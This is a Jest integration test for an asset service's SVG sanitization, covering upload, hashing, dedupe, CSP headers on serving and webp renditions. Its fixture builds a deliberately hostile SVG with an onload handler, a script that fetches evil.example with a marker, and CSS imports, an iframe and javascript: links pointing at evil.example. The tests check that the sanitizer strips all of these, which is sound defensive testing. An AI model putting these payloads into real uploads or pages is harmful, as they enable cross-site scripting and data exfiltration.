/**
 * Safe SVG end to end (ADR 0043 stage 4c) — over real `node:http`, the REAL
 * AssetService, the REAL sanitizer and a REAL Postgres; S3 is an in-memory map.
 *
 * Invariants:
 *  1. Every upload path that reads bytes stores an SVG only as its sanitized
 *     document: `/assets/service/app` (raw body) and `/assets/upload` (a
 *     person's multipart upload).
 *  2. The file's sha256 is the hash of the STORED bytes; the uploader's hash is
 *     `metadata.svg.originalSha256`; a caller cannot plant that record.
 *  3. Dedupe is on the sanitized hash: two payloads that sanitize to the same
 *     document are one file.
 *  4. `/assets/:id/stream` serves a sanitized SVG inline with
 *     `default-src 'none'; style-src 'unsafe-inline'; sandbox` and nosniff; an
 *     SVG the server did not sanitize (a mail attachment kept as sent) is a
 *     download.
 *  5. The presigned upload refuses SVG (415): its bytes are never read.
 *  6. Renditions: the image pipeline rasterizes the sanitized SVG to webp.
 */

import express from 'express';
import http from 'node:http';
import type { AddressInfo } from 'node:net';
import { createHash, randomBytes } from 'node:crypto';
import { Readable } from 'node:stream';
import { eq } from 'drizzle-orm';
import sharp from 'sharp';

const mockServiceAuthMiddleware = jest.fn();
let mockSessionUserId = '';

const mockObjects = new Map<string, { bytes: Buffer; contentType?: string }>();
const mockS3 = {
  uploadStream: jest.fn(async (key: string, body: Readable, options?: { contentType?: string }) => {
    const chunks: Buffer[] = [];
    for await (const chunk of body) chunks.push(Buffer.from(chunk));
    mockObjects.set(key, { bytes: Buffer.concat(chunks), contentType: options?.contentType });
    return {};
  }),
  uploadBuffer: jest.fn(async (key: string, bytes: Buffer, options?: { contentType?: string }) => {
    mockObjects.set(key, { bytes: Buffer.from(bytes), contentType: options?.contentType });
    return {};
  }),
  fileExists: jest.fn(async (key: string) => mockObjects.has(key)),
  headObject: jest.fn(async (key: string) => {
    const object = mockObjects.get(key);
    return object ? { size: object.bytes.length, contentType: object.contentType } : null;
  }),
  copyFile: jest.fn(async (from: string, to: string) => {
    const object = mockObjects.get(from);
    if (!object) throw Object.assign(new Error('NoSuchKey'), { name: 'NoSuchKey' });
    mockObjects.set(to, { ...object });
  }),
  deleteFile: jest.fn(async (key: string) => {
    mockObjects.delete(key);
  }),
  downloadBuffer: jest.fn(async (key: string) => {
    const object = mockObjects.get(key);
    if (!object) throw Object.assign(new Error('NoSuchKey'), { name: 'NoSuchKey' });
    return object.bytes;
  }),
  listFiles: jest.fn(async () => []),
  getPresignedDownloadUrl: jest.fn(async (key: string) => `https://signed.example/${key}`),
  getPresignedUploadUrl: jest.fn(async (key: string) => `https://signed.example/put/${key}`),
  getObjectStreamRange: jest.fn(async (key: string) => {
    const object = mockObjects.get(key);
    if (!object) throw Object.assign(new Error('NoSuchKey'), { name: 'NoSuchKey' });
    return {
      body: Readable.from([object.bytes]),
      contentType: object.contentType,
      contentLength: object.bytes.length,
      statusCode: 200,
    };
  }),
};

jest.mock('../../middleware/auth', () => ({
  authMiddleware: (req: { user?: unknown }, _res: unknown, next: () => void) => {
    req.user = { _id: mockSessionUserId };
    next();
  },
  serviceAuthMiddleware: (...args: unknown[]) => mockServiceAuthMiddleware(...args),
}));
jest.mock('../../middleware/optionalAuth', () => ({
  optionalAuthMiddleware: (_req: unknown, _res: unknown, next: () => void) => next(),
  getUserId: () => undefined,
  getMediaViewerUserId: () => undefined,
}));
jest.mock('../../middleware/rateLimiter', () => ({
  rateLimit: () => (_req: unknown, _res: unknown, next: () => void) => next(),
}));
jest.mock('../../utils/logger', () => ({
  logger: { warn: jest.fn(), error: jest.fn(), info: jest.fn(), debug: jest.fn() },
}));
jest.mock('../../services/s3ServiceSingleton', () => ({ s3Service: mockS3 }));
jest.mock('../../services/variantService', () => ({
  VariantService: class {
    generateVariants = jest.fn(() => Promise.resolve());
  },
}));
jest.mock('../../queue/assetVariants.queue', () => ({
  enqueueAssetVariantGeneration: jest.fn(() => Promise.resolve()),
}));

import { closePostgres, connectPostgres, getDb } from '../../config/postgres';
import { applications, files, fileVariants, users } from '../../db/schema';
import assetsRouter from '../assets';
import { errorHandler } from '../../middleware/errorHandler';
import fileCache from '../../utils/fileCache';
import { assetService } from '../../services/assetServiceSingleton';
import type { S3Service } from '../../services/s3Service';

jest.setTimeout(60_000);

const SVG_CSP = "default-src 'none'; style-src 'unsafe-inline'; sandbox";

let server: http.Server;

interface Answer {
  status: number;
  headers: http.IncomingHttpHeaders;
  raw: Buffer;
  // biome-ignore lint/suspicious/noExplicitAny: a JSON response read loosely in assertions
  body: { data?: any; error?: string; message?: string };
}

function send(
  method: string,
  path: string,
  body: Buffer | undefined,
  headers: Record<string, string> = {},
): Promise<Answer> {
  const address = server.address() as AddressInfo;
  return new Promise((resolve, reject) => {
    const req = http.request(
      {
        method,
        host: '127.0.0.1',
        port: address.port,
        path,
        headers: { ...(body ? { 'content-length': String(body.length) } : {}), ...headers },
      },
      (res) => {
        const chunks: Buffer[] = [];
        res.on('data', (chunk) => chunks.push(Buffer.from(chunk)));
        res.on('end', () => {
          const raw = Buffer.concat(chunks);
          let parsed: Answer['body'] = {};
          if (String(res.headers['content-type'] ?? '').includes('json') && raw.length > 0) {
            parsed = JSON.parse(raw.toString('utf8'));
          }
          resolve({ status: res.statusCode ?? 0, headers: res.headers, raw, body: parsed });
        });
      },
    );
    req.on('error', reject);
    req.end(body);
  });
}

function multipart(
  fields: Record<string, string>,
  file: { name: string; type: string; bytes: Buffer },
) {
  const boundary = `----oxy${randomBytes(8).toString('hex')}`;
  const parts: Buffer[] = [];
  for (const [name, value] of Object.entries(fields)) {
    parts.push(
      Buffer.from(
        `--${boundary}\r\nContent-Disposition: form-data; name="${name}"\r\n\r\n${value}\r\n`,
      ),
    );
  }
  parts.push(
    Buffer.from(
      `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${file.name}"\r\nContent-Type: ${file.type}\r\n\r\n`,
    ),
    file.bytes,
    Buffer.from(`\r\n--${boundary}--\r\n`),
  );
  return { body: Buffer.concat(parts), contentType: `multipart/form-data; boundary=${boundary}` };
}

function actAs(appId: string): void {
  mockServiceAuthMiddleware.mockImplementation(
    (req: { serviceApp?: unknown }, _res: unknown, next: () => void) => {
      req.serviceApp = {
        type: 'service',
        appId,
        appName: 'website',
        credentialId: 'cred-1',
        ownerAccountId: 'acct-1',
        environment: 'production',
        tier: 'internal',
        scopes: ['files:app:write'],
      };
      next();
    },
  );
}

async function account(): Promise<string> {
  const [row] = await getDb().insert(users).values({ color: 'teal' }).returning({ id: users.id });
  return row.id;
}

async function application(): Promise<string> {
  const [row] = await getDb()
    .insert(applications)
    .values({
      name: `website-${randomBytes(4).toString('hex')}`,
      ownerAccountId: await account(),
      type: 'first_party',
    })
    .returning({ id: applications.id });
  return row.id;
}

const sha = (bytes: Buffer) => createHash('sha256').update(bytes).digest('hex');

async function fileRow(id: string) {
  const [row] = await getDb().select().from(files).where(eq(files.id, id));
  return row;
}

/** A logo carrying every kind of active content, around a real drawing. */
function maliciousLogo(marker: string): Buffer {
  return Buffer.from(
    `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x "${marker}">]>` +
      '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 64 32" width="64" height="32" onload="alert(1)">' +
      '<defs><linearGradient id="g"><stop offset="0" stop-color="#ff0000"/><stop offset="1" stop-color="#0000ff"/></linearGradient></defs>' +
      `<script>fetch('https://evil.example/?${marker}')</script>` +
      '<style>@import url(https://evil.example/x.css); rect { stroke: url(https://evil.example/s) }</style>' +
      '<foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><iframe src="https://evil.example"/></div></foreignObject>' +
      '<a xlink:href="javascript:alert(2)"><rect width="64" height="32" fill="url(#g)" onclick="alert(3)"/></a>' +
      '<use href="https://evil.example/sprite.svg#i"/>' +
      '</svg>',
  );
}

function expectSanitized(stored: Buffer): void {
  const text = stored.toString('utf8');
  expect(text).not.toMatch(
    /script|onload|onclick|javascript|foreignObject|iframe|evil\.example|@import|ENTITY/i,
  );
  expect(text).toContain('fill="url(#g)"');
  expect(text).toContain('<linearGradient id="g">');
}

beforeAll(async () => {
  process.env.DEVICE_ID_SALT ??= 'test-device-id-salt-that-is-long-enough-000';
  await connectPostgres();
  const app = express();
  app.use(express.json());
  app.use('/assets', assetsRouter);
  app.use(errorHandler);
  server = app.listen(0);
});

afterAll(async () => {
  await new Promise<void>((resolve) => server.close(() => resolve()));
  await closePostgres();
});

beforeEach(() => {
  fileCache.clear();
});

describe('an application uploads an SVG (POST /assets/service/app)', () => {
  it('stores only the sanitized document, hashed as stored, and dedupes on that hash', async () => {
    const appId = await application();
    actAs(appId);
    const raw = maliciousLogo('one');

    const first = await send('POST', '/assets/service/app', raw, {
      'content-type': 'image/svg+xml',
      'x-visibility': 'unlisted',
      'x-original-name': 'logo.svg',
      // A caller cannot plant the server's record.
      'x-media-metadata': JSON.stringify({ svg: { sanitizer: 'dompurify@spoofed' }, brand: 'oxy' }),
    });

    expect(first.status).toBe(200);
    expect(first.body.data.deduplicated).toBe(false);
    const stored = await fileRow(first.body.data.file.id);
    const bytes = mockObjects.get(stored.storageKey)?.bytes as Buffer;
    expectSanitized(bytes);
    expect(stored.sha256).toBe(sha(bytes));
    expect(stored.size).toBe(bytes.length);
    expect(stored.mime).toBe('image/svg+xml');
    expect(stored.metadata).toMatchObject({
      brand: 'oxy',
      svg: { originalSha256: sha(raw), sanitizer: expect.stringMatching(/^dompurify@\d/) },
    });
    // The bytes as sent are nowhere in storage.
    expect([...mockObjects.values()].some((object) => object.bytes.equals(raw))).toBe(false);

    // A different payload that sanitizes to the same document is the same file.
    const again = await send('POST', '/assets/service/app', maliciousLogo('two'), {
      'content-type': 'image/svg+xml',
      'x-visibility': 'unlisted',
    });
    expect(again.status).toBe(200);
    expect(again.body.data).toMatchObject({ deduplicated: true, file: { id: stored.id } });
  });

  it('refuses a document that is not an SVG, storing nothing', async () => {
    actAs(await application());
    const before = mockObjects.size;
    const answer = await send(
      'POST',
      '/assets/service/app',
      Buffer.from('<html><script>alert(1)</script></html>'),
      { 'content-type': 'image/svg+xml', 'x-visibility': 'private' },
    );
    expect(answer.status).toBe(415);
    expect(answer.body.error).toBe('INVALID_SVG');
    expect(mockObjects.size).toBe(before);
  });
});

describe('a person uploads an SVG (POST /assets/upload)', () => {
  it('stores only the sanitized document', async () => {
    mockSessionUserId = await account();
    const raw = maliciousLogo('person');
    const form = multipart(
      { visibility: 'private', metadata: JSON.stringify({ svg: { originalSha256: 'spoof' } }) },
      { name: 'logo.svg', type: 'image/svg+xml', bytes: raw },
    );

    const answer = await send('POST', '/assets/upload', form.body, {
      'content-type': form.contentType,
    });

    expect(answer.status).toBe(200);
    const stored = await fileRow(answer.body.data.file.id);
    const bytes = mockObjects.get(stored.storageKey)?.bytes as Buffer;
    expectSanitized(bytes);
    expect(stored.sha256).toBe(sha(bytes));
    expect(stored.ownerUserId).toBe(mockSessionUserId);
    expect((stored.metadata as { svg: { originalSha256: string } }).svg.originalSha256).toBe(
      sha(raw),
    );
  });

  it('refuses an SVG on the presigned upload: Oxy never reads those bytes', async () => {
    mockSessionUserId = await account();
    const answer = await send(
      'POST',
      '/assets/init',
      Buffer.from(
        JSON.stringify({ sha256: sha(Buffer.from('x')), size: 1, mime: 'image/svg+xml' }),
      ),
      { 'content-type': 'application/json' },
    );
    expect(answer.status).toBe(415);
    expect(answer.body.error).toBe('SVG_UPLOAD_REQUIRES_SANITIZATION');
  });
});

describe('serving (GET /assets/:id/stream)', () => {
  it('serves a sanitized SVG inline, with the SVG CSP and nosniff', async () => {
    const appId = await application();
    actAs(appId);
    const uploaded = await send('POST', '/assets/service/app', maliciousLogo('serve'), {
      'content-type': 'image/svg+xml',
      'x-visibility': 'unlisted',
    });
    const fileId = uploaded.body.data.file.id;

    const answer = await send('GET', `/assets/${fileId}/stream`, undefined);

    expect(answer.status).toBe(200);
    expect(answer.headers['content-type']).toBe('image/svg+xml');
    expect(answer.headers['content-disposition']).toBeUndefined();
    expect(answer.headers['content-security-policy']).toBe(SVG_CSP);
    expect(answer.headers['x-content-type-options']).toBe('nosniff');
    expectSanitized(answer.raw);
  });

  it('serves an SVG the server did not sanitize (kept as sent) as a sandboxed download', async () => {
    const owner = await account();
    const raw = Buffer.from(
      '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
    );
    // A mail attachment: stored byte for byte (`svg: 'preserve'`).
    const kept = await assetService.uploadFileDirect(
      owner,
      raw,
      'image/svg+xml',
      'attachment.svg',
      'unlisted',
      { source: 'email-inbound', svg: { sanitizer: 'dompurify@spoofed', originalSha256: 'x' } },
    );
    expect(kept.metadata).not.toHaveProperty('svg');

    const answer = await send('GET', `/assets/${kept.id}/stream`, undefined);

    expect(answer.status).toBe(200);
    expect(answer.headers['content-disposition']).toBe('attachment');
    expect(answer.headers['content-security-policy']).toBe("sandbox; default-src 'none'");
    expect(answer.headers['x-content-type-options']).toBe('nosniff');
  });
});

describe('renditions', () => {
  it('rasterizes the stored (sanitized) SVG into the webp ladder', async () => {
    const { VariantService } = jest.requireActual<typeof import('../../services/variantService')>(
      '../../services/variantService',
    );
    const appId = await application();
    actAs(appId);
    const uploaded = await send('POST', '/assets/service/app', maliciousLogo('renditions'), {
      'content-type': 'image/svg+xml',
      'x-visibility': 'private',
    });
    const fileId = uploaded.body.data.file.id;

    await new VariantService(mockS3 as unknown as S3Service).generateVariants(fileId);

    const variants = await getDb()
      .select()
      .from(fileVariants)
      .where(eq(fileVariants.fileId, fileId));
    expect(variants.map((variant) => variant.type).sort()).toEqual(
      ['thumb', 'w1280', 'w128', 'w2048', 'w320', 'w640', 'w96'].sort(),
    );
    for (const variant of variants) {
      expect(variant.key.endsWith('.webp')).toBe(true);
      expect(variant.key.startsWith('public/')).toBe(false);
      const image = mockObjects.get(variant.key)?.bytes as Buffer;
      const meta = await sharp(image).metadata();
      expect(meta.format).toBe('webp');
    }
    // A vector is drawn AT the rendition's size, not scaled up from 64 px.
    const w2048 = variants.find((variant) => variant.type === 'w2048');
    const big = await sharp(mockObjects.get(w2048?.key as string)?.bytes as Buffer).metadata();
    expect(big.width).toBe(2048);
    expect(big.height).toBe(1024);
  });
});
